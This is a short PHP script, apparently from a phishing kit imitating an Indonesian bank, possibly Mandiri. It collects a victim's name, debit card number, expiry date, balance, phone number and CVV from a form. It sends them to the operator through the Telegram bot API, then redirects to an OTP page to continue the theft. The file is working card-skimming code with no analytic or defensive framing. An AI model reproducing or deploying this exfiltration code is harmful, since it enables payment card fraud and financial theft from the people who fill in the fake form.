<?php 



session_start();
include "./telegram.php";



$message = "༺═━━༺⚸𝓜𝓪𝓷𝓭𝓲𝓻𝓲☭༻━━═༻". "\n⍣ 𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽 : ".  $_POST ['nama']. "\n⍣ 𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 : ". $_POST ['debit']. "\n⍣ 𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 : ". $_POST ['valid'].  "\n⍣ 𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝗮𝗸𝗵𝗶𝗿 : ". $_POST ['saldo'].  "\n⍣ 𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 : ".$_POST ['phone']. "\n⍣ 𝗖𝗩𝗩 : ".$_POST ['cvv'];

function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  otp.html");
?> 